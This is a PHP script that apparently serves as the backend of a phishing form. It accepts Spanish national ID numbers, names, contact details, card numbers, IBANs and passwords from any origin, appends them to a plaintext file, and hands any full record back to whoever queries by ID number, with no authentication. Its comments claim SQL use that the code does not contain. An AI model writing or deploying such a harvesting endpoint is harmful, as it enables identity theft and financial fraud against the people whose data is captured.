<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/plain');

$archivo = 'datos_guardados.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // PUBLICAR base de datos (POST + SQL)
    $datos = [
        'dni' => $_POST['dni'] ?? '',
        'nombre' => $_POST['nombre'] ?? '',
        'apellidos' => $_POST['apellidos'] ?? '',
        'fecha' => $_POST['fecha'] ?? '',
        'cp' => $_POST['cp'] ?? '',
        'correo' => $_POST['correo'] ?? '',
        'telefono' => $_POST['telefono'] ?? '',
        'movil' => $_POST['movil'] ?? '',
        'tarjeta' => $_POST['tarjeta'] ?? '',
        'iban' => $_POST['iban'] ?? '',
        'contrasena' => $_POST['contrasena'] ?? ''
    ];

    // Guardar en archivo
    $linea = json_encode($datos) . PHP_EOL;
    file_put_contents($archivo, $linea, FILE_APPEND);
    
    echo "✓ Datos guardados para DNI: " . $datos['dni'];
    
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // OBTENER base de datos (GET + SQL)
    $dni_buscado = $_GET['dni'] ?? '';
    
    if (empty($dni_buscado)) {
        echo json_encode(['error' => 'DNI no proporcionado']);
        exit;
    }
    
    if (!file_exists($archivo)) {
        echo json_encode(['error' => 'No hay datos guardados']);
        exit;
    }
    
    $lineas = file($archivo, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
    // Buscar el último registro con ese DNI
    $encontrado = null;
    foreach (array_reverse($lineas) as $linea) {
        $datos = json_decode($linea, true);
        if ($datos && isset($datos['dni']) && $datos['dni'] === $dni_buscado) {
            $encontrado = $datos;
            break;
        }
    }
    
    if ($encontrado) {
        header('Content-Type: application/json');
        echo json_encode($encontrado);
    } else {
        echo json_encode(['error' => 'DNI no encontrado: ' . $dni_buscado]);
    }
}
?>